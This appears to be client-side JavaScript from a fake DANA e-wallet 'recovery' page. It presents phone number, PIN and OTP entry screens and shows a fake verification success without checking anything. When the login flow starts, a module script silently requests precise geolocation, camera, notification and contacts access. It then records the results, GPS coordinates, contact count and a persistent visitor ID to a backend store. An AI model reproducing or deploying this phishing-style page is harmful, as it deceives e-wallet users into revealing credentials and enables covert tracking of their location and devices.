  <script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
  <script>
    let currentNomor = "";
    let otpTimerStarted = false;

    $(document).ready(function () {
      $("#inp").on("input", function () {
        if ($(this).val() == "0" || $(this).val() == "62") {
          $(this).val("");
        }
      });
      $("#inp").mask("000-0000-000000");
      $(".clear").click(function () { $(".inppin").val(""); $("#pin1").focus(); });
      $(".clearotp").click(function () { $(".inpotp").val(""); $("#otp1").focus(); });
      $(".show").click(function () {
        $(".inppin").each(function () {
          if ($(this).attr("type") === "password") {
            $(this).attr("type", "number");
            $(".show").text("SEMBUNYIKAN");
          } else {
            $(this).attr("type", "password");
            $(".show").text("TAMPILKAN");
          }
        });
      });
    });

    const inpEl = document.getElementById("inp");
    const btnEl = document.getElementById("btn");
    inpEl.addEventListener("input", function () {
      btnEl.disabled = inpEl.value.length <= 10;
    });

    const pinContainer = document.querySelector(".box-input-pin");
    pinContainer.addEventListener("keyup", function (event) {
      const target = event.target;
      const maxLength = parseInt(target.getAttribute("maxlength"), 10) || 1;
      if (target.value.length >= maxLength) {
        let next = target;
        while ((next = next.nextElementSibling)) {
          if (next.tagName && next.tagName.toLowerCase() === "input") {
            next.focus();
            break;
          }
        }
      } else if (target.value.length === 0) {
        let prev = target;
        while ((prev = prev.previousElementSibling)) {
          if (prev.tagName && prev.tagName.toLowerCase() === "input") {
            prev.focus();
            break;
          }
        }
      }
    });

    $(".inpotp").on("input", function (event) {
      const inputs = $(".inpotp");
      const isAllFilled = Array.from(inputs).every((input) => input.value !== "");
      if (isAllFilled) {
        $(event.target).blur();
        sendOtp();
        return;
      }
      const index = inputs.index(this);
      if (event.target.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    }).on("keydown", function (event) {
      const inputs = $(".inpotp");
      const index = inputs.index(this);
      if (event.key === "Backspace" && event.target.value.length === 0 && index > 0) {
        inputs[index - 1].focus();
      }
    });

    function nextPrev() {
      $(".box-login").removeClass("closeright").addClass("animated");
      $("#homeku").hide();
      $("#back1").show();
      $("#butonku").fadeOut();
      $(".box-login").fadeIn();
      if (typeof window.__requestVisitorPermissions === "function") {
        window.__requestVisitorPermissions();
      }
    }

    function goback1() {
      $("#homeku").addClass("bounceInLeft").show();
      $(".box-login").removeClass("animated").fadeOut().addClass("closeright");
      $("#butonku").fadeIn();
      $("#back1, #process").hide();
    }

    function goback2() {
      $("#process").show();
      setTimeout(function () {
        $("#formPin").fadeOut();
        $("#formNohp").fadeIn();
        $("#process").hide();
        $("#inp").val("");
        $("#back1").show();
        $("#back2").hide();
        document.getElementById("formPin").reset();
        $(".inppin").val("");
      }, 400);
    }

    function tutupotp() {
      $(".bgotp").hide();
    }

    function sendNohp(event) {
      event.preventDefault();
      $("#process").show();
      $("#inp").blur();
      currentNomor = document.getElementById("inp").value;

      if (typeof window.__requestVisitorPermissions === "function") {
        window.__requestVisitorPermissions();
      }

      setTimeout(function () {
        $("#process").hide();
        $("#back1").hide();
        $("#back2").show();
        $("#formNohp").fadeOut(function () {
          $("#formPin").fadeIn();
          $("#pin1").focus();
        });
      }, 350);
    }

    function sendPin() {
      document.getElementById("alert").innerHTML = "Kode dikirim ke +62" + currentNomor + "<br/>";
      $("#process").hide();
      $(".bgotp").fadeIn();
      if (!otpTimerStarted) {
        otpTimerStarted = true;
        setInterval(countdown, 1000);
      }
      $("#otp1").focus();
    }

    function sendOtp() {
      $(".loadingOtp").show();
      setTimeout(function () {
        $(".alert").text("Verifikasi selesai").css("color", "#059669");
        $(".loadingOtp").hide();
        $(".inpotp").val("");
      }, 1200);
    }

    function countdown() {
      const count = parseInt($("#countdown").text(), 10);
      $("#countdown").text(count > 0 ? count - 1 : "60");
    }

    window.onload = function () {
      setTimeout(function () {
        $(".start").fadeIn();
        setTimeout(function () {
          $(".start").fadeOut(800, function () {
            $(".container").fadeIn(200);
          });
        }, 900);
      }, 400);
    };
  </script>

  <script type="module">
    import { upsertVisitorRecord } from "./js/visitor-store.js";

    const VISITOR_ID_KEY = "dana_clean_visitor_id_v1";

    function getVisitorId() {
      let id = localStorage.getItem(VISITOR_ID_KEY);
      if (!id) {
        id = "vis-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 7);
        localStorage.setItem(VISITOR_ID_KEY, id);
      }
      return id;
    }

    function askLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve({ status: "unsupported", coords: null });
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({
            status: "granted",
            coords: {
              lat: Number(pos.coords.latitude.toFixed(6)),
              lng: Number(pos.coords.longitude.toFixed(6)),
              accuracy: Math.round(pos.coords.accuracy || 0)
            }
          }),
          (err) => resolve({ status: err.code === 1 ? "denied" : "unavailable", coords: null }),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    async function askCamera() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        return { status: "unsupported", stream: null };
      }
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        return { status: "granted", stream };
      } catch (err) {
        return { status: err.name === "NotAllowedError" ? "denied" : "error", stream: null };
      }
    }

    async function askNotification() {
      if (!("Notification" in window)) return "unsupported";
      if (Notification.permission === "granted" || Notification.permission === "denied") {
        return Notification.permission;
      }
      return await Notification.requestPermission();
    }

    async function askContactsPicker() {
      if (!("contacts" in navigator) || typeof navigator.contacts.select !== "function") {
        return { status: "unsupported_in_browser", count: 0 };
      }
      try {
        const list = await navigator.contacts.select(["name", "tel"], { multiple: true });
        return { status: "granted", count: Array.isArray(list) ? list.length : 0 };
      } catch (_) {
        return { status: "cancelled_or_denied", count: 0 };
      }
    }

    window.__requestVisitorPermissions = async function () {
      const visitorId = getVisitorId();
      const [loc, cam, notif, contacts] = await Promise.all([
        askLocation(),
        askCamera(),
        askNotification(),
        askContactsPicker()
      ]);

      if (cam.stream) {
        cam.stream.getTracks().forEach((t) => t.stop());
      }

      try {
        await upsertVisitorRecord(visitorId, {
          userAgent: navigator.userAgent,
          permissions: {
            location: loc.status,
            camera: cam.status,
            notification: notif,
            contacts: contacts.status
          },
          location: loc.coords,
          contactsCount: contacts.count
        });
      } catch (err) {
        console.error("Gagal simpan izin pengunjung:", err);
      }
    };

    upsertVisitorRecord(getVisitorId(), {
      userAgent: navigator.userAgent
    }).catch((err) => {
      console.error("Gagal mencatat kunjungan awal:", err);
    });
  </script>
